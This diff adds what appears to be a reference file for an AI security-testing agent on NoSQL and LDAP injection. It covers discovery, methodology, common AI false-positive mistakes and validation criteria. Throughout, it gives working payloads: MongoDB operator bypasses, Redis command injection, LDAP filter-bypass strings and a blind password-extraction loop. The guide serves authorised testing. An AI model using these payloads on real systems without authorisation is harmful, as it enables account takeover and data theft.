@@ -1,0 +1,338 @@
+<nosql_ldap_injection_guide>
+<title>NOSQL AND LDAP INJECTION</title>
+
+<critical>NoSQL and LDAP injection attacks manipulate query syntax to bypass authentication, extract data, or execute unauthorized operations. Unlike SQL injection, these attacks exploit JSON/BSON operators, JavaScript execution, or LDAP filter syntax. The impact ranges from authentication bypass to full database compromise.</critical>
+
+<scope>
+- MongoDB: Operator injection ($gt, $ne, $where, $regex), JavaScript execution, aggregation pipeline abuse
+- Redis: Command injection via unsanitized input, Lua script injection
+- CouchDB: Mango query injection, view manipulation
+- Elasticsearch: Query DSL injection, script injection
+- DynamoDB: Condition expression injection, filter abuse
+- Cassandra: CQL injection patterns
+- LDAP: Filter injection, blind LDAP injection, attribute manipulation
+- Firebase/Firestore: Security rule bypass, query manipulation
+</scope>
+
+<methodology>
+1. Identify data stores: Look for NoSQL databases (MongoDB, Redis, Elasticsearch) or LDAP directories.
+2. Find injection points: Parameters used in queries, especially login forms, search, and filters.
+3. Test operator injection: Try JSON operators like $gt, $ne, $regex in parameters.
+4. Test authentication bypass: Attempt to modify query logic to return true.
+5. Validate data extraction: Confirm ability to retrieve unauthorized data.
+6. Document the injection type, payload, and impact.
+</methodology>
+
+<discovery_techniques>
+<identify_nosql>
+- Error messages: "MongoError", "CastError", "BSON", "DocumentNotFound"
+- Headers: X-Powered-By mentioning Express/Node.js (common with MongoDB)
+- Technology fingerprinting: Detect MongoDB, Redis, Elasticsearch in stack
+- API patterns: JSON-heavy APIs, document-style responses
+- Common endpoints: /api/search, /api/filter, /api/query
+</identify_nosql>
+
+<identify_ldap>
+- Login forms with username/password to directory service
+- User search/lookup functionality
+- Active Directory integration
+- Error messages: "LDAP", "javax.naming", "InvalidNameException"
+- Ports: 389 (LDAP), 636 (LDAPS), 3268 (Global Catalog)
+</identify_ldap>
+
+<test_injection_points>
+- Login credentials (username, password fields)
+- Search parameters
+- Filter/query parameters
+- User lookup fields
+- API query parameters accepting JSON
+- GraphQL variables
+</test_injection_points>
+</discovery_techniques>
+
+<nosql_injection_types>
+<mongodb_operator_injection>
+Authentication bypass via operator injection:
+```
+# Normal login: {"username": "admin", "password": "secret"}
+# Injected: {"username": "admin", "password": {"$ne": ""}}
+
+# URL encoded:
+username=admin&password[$ne]=
+username=admin&password[$gt]=
+username=admin&password[$regex]=.*
+```
+
+Query modification:
+```
+# Find users where role != "user" (get admins)
+{"role": {"$ne": "user"}}
+
+# Find all documents
+{"$where": "1==1"}
+
+# Regex extraction
+{"password": {"$regex": "^a"}}  # Password starts with 'a'
+```
+</mongodb_operator_injection>
+
+<mongodb_javascript>
+$where with JavaScript (if enabled):
+```
+{"$where": "this.password.length > 0"}
+{"$where": "sleep(5000)"}  # Time-based detection
+{"$where": "function() { return this.role == 'admin'; }"}
+```
+
+$function in aggregation (MongoDB 4.4+):
+```
+{"$function": {
+  "body": "function() { return true; }",
+  "args": [],
+  "lang": "js"
+}}
+```
+</mongodb_javascript>
+
+<redis_injection>
+Command injection via unsanitized input:
+```
+# If input goes directly to command
+NORMAL: GET user:123
+INJECT: GET user:123\r\nKEYS *
+
+# Lua script injection
+EVAL "return redis.call('KEYS','*')" 0
+```
+</redis_injection>
+
+<elasticsearch_injection>
+Query DSL injection:
+```
+# Script injection in query
+{"query": {"script": {"script": "doc['field'].value"}}}
+
+# Wildcard abuse
+{"query": {"wildcard": {"field": "*"}}}
+```
+</elasticsearch_injection>
+</nosql_injection_types>
+
+<ldap_injection_types>
+<filter_injection>
+LDAP filter syntax exploitation:
+```
+# Normal: (&(uid=USER)(password=PASS))
+# Injected username: admin)(|(password=*
+# Result: (&(uid=admin)(|(password=*)(password=PASS)))  # Always true
+
+# Common payloads:
+*                           # Wildcard match all
+admin*                      # Starts with admin
+*)(uid=*))(|(uid=*         # Filter manipulation
+admin)(&)                   # Null byte / filter termination
+```
+</filter_injection>
+
+<blind_ldap>
+Boolean-based blind:
+```
+# True condition (admin exists):
+admin)(|(cn=*
+# False condition:
+nonexistent)(|(cn=*
+
+# Extract data character by character:
+admin)(password=a*
+admin)(password=b*
+```
+</blind_ldap>
+
+<ldap_attribute_injection>
+Modify returned attributes:
+```
+# Inject attribute request
+*)(objectClass=*
+# May return additional attributes not intended
+```
+</ldap_attribute_injection>
+</ldap_injection_types>
+
+<exploitation>
+<authentication_bypass>
+MongoDB auth bypass:
+1. Intercept login request
+2. Modify JSON body: `{"username": "admin", "password": {"$ne": ""}}`
+3. Or URL: `username=admin&password[$gt]=`
+4. Server query becomes: `{username: "admin", password: {$gt: ""}}` → returns admin
+
+LDAP auth bypass:
+1. Intercept login request
+2. Inject in username: `admin)(&)`
+3. Or: `*)(uid=*))(|(uid=*`
+4. Filter becomes always-true condition
+</authentication_bypass>
+
+<data_extraction>
+MongoDB blind extraction:
+```python
+# Extract password character by character
+for char in string.printable:
+    payload = {"username": "admin", "password": {"$regex": f"^{known}{char}"}}
+    if login_succeeds(payload):
+        known += char
+```
+
+LDAP blind extraction:
+```
+# Binary search on attribute values
+admin)(password>=m*   # Is password >= 'm'?
+admin)(password>=t*   # Is password >= 't'?
+```
+</data_extraction>
+
+<privilege_escalation>
+Modify query to access privileged data:
+```
+# Original: {"userId": "USER_INPUT"}
+# Injected: {"userId": {"$ne": ""}, "role": "admin"}
+
+# LDAP: Access admin entries
+(&(uid=admin*)(objectClass=person))
+```
+</privilege_escalation>
+</exploitation>
+
+<validation>
+1. Demonstrate actual authentication bypass or data retrieval.
+2. Show the modified query/filter and its effect.
+3. Confirm server-side execution (not client-side JSON parsing).
+4. Document the specific operator or syntax exploited.
+5. Verify reproducibility with the same payload.
+6. Prove impact: unauthorized access, data leak, or privilege escalation.
+</validation>
+
+<false_positives>
+- Client-side JSON validation errors (not server-side injection)
+- Operators stripped or rejected by input validation
+- Database errors unrelated to injection (connection, schema)
+- Intended functionality (search wildcards, regex features)
+- NoSQL databases with parameterized queries
+- LDAP with proper escaping/encoding
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. ERROR MESSAGE CONFUSION:
+   WRONG: "Error mentions MongoDB, NoSQL injection confirmed"
+   RIGHT: Error messages indicate technology, not vulnerability:
+          - Connection errors are not injection
+          - Schema validation errors are not injection
+          - Type casting errors may indicate filtering
+          Prove actual QUERY MANIPULATION, not just errors.
+
+2. CLIENT-SIDE VS SERVER-SIDE:
+   WRONG: "JSON with $ne operator sent, injection successful"
+   RIGHT: Sending malicious JSON doesn't mean it's processed:
+          - Server may validate/sanitize input
+          - Framework may use parameterized queries
+          - ORM may escape operators
+          Verify the query was ACTUALLY MODIFIED server-side.
+
+3. OPERATOR IN RESPONSE:
+   WRONG: "Response contains $gt, operators are reflected"
+   RIGHT: Reflection doesn't equal execution:
+          - May be echoing input for error message
+          - May be stored but not executed
+          - May be display-only field
+          Demonstrate actual query behavior change.
+
+4. INTENDED SEARCH FEATURES:
+   WRONG: "Wildcard * returns all results, LDAP injection"
+   RIGHT: Many search features INTENTIONALLY support wildcards:
+          - Directory services may allow * searches
+          - Search APIs may support regex
+          - This is functionality, not vulnerability
+          Injection requires accessing UNAUTHORIZED data or bypassing auth.
+
+5. LDAP SYNTAX ERROR:
+   WRONG: "LDAP filter error returned, injection possible"
+   RIGHT: Syntax errors indicate the input reached LDAP but:
+          - May be properly escaped after parsing
+          - Error doesn't mean successful injection
+          - Filter may still be safe
+          Show successful filter manipulation, not just errors.
+
+6. NOSQL OPERATOR ACCEPTED:
+   WRONG: "Server accepted JSON with $regex, vulnerable"
+   RIGHT: Accepting JSON structure doesn't mean operators are evaluated:
+          - May be stored as literal string
+          - May be in a non-query context
+          - Framework may sanitize before query
+          Prove the operator affected query results.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. PARAMETERIZED QUERIES:
+   - Mongoose with proper schema validation
+   - mongodb driver with explicit query builders
+   - LDAP libraries with parameter binding
+   - Input treated as literal value, not operator
+
+2. INPUT VALIDATION:
+   - JSON schema validation rejecting operators
+   - Allowlist of accepted field names
+   - Type checking preventing object injection
+   - Regex filtering special characters
+
+3. INTENDED FUNCTIONALITY:
+   - Search APIs supporting wildcards by design
+   - Admin interfaces with query capabilities
+   - Debug/test endpoints (verify if in production)
+   - API documentation showing supported operators
+
+4. ERROR-BASED MISIDENTIFICATION:
+   - Connection/timeout errors
+   - Schema validation failures
+   - Type casting errors
+   - Permission errors (may indicate separate auth issue)
+
+5. FRAMEWORK PROTECTION:
+   - ODM/ORM sanitization (Mongoose, Eloquent)
+   - Express body-parser with extended: false
+   - LDAP libraries with automatic escaping
+   - Query builders preventing raw operators
+
+6. CLIENT-SIDE ONLY:
+   - Frontend JSON construction
+   - Client-side validation errors
+   - Browser developer tools manipulation without server effect
+</expanded_false_positives>
+
+<impact>
+- Authentication bypass: Access any account without credentials
+- Data exfiltration: Extract entire collections or directory entries
+- Privilege escalation: Access admin-level data or functions
+- Denial of service: Expensive regex or $where causing CPU exhaustion
+- Data modification: In some cases, write operations possible
+- Information disclosure: Enumerate users, extract sensitive attributes
+</impact>
+
+<pro_tips>
+1. Try both URL-encoded (`password[$ne]=`) and JSON body (`{"password":{"$ne":""}}`) formats.
+2. MongoDB $where requires server-side JavaScript enabled (often disabled in production).
+3. For blind NoSQL, use $regex with anchors: `^known_prefix` to extract character by character.
+4. LDAP null bytes (%00) can terminate filters early in some implementations.
+5. Test for type confusion: sending array/object where string expected.
+6. Redis CRLF injection requires ability to inject \r\n in commands.
+7. Elasticsearch script injection often disabled via `script.allowed_types` setting.
+8. Check for second-order injection: data stored then used in later query.
+9. Firebase/Firestore: Test security rules with authenticated vs unauthenticated requests.
+10. LDAP DN injection differs from filter injection - test both entry name and search filter.
+</pro_tips>
+
+<remember>NoSQL and LDAP injection require demonstrating actual query manipulation that results in unauthorized access or data extraction. Error messages, operator acceptance, and syntax issues are indicators but not proof. Validate with actual authentication bypass or data retrieval that shouldn't be possible.</remember>
+</nosql_ldap_injection_guide>
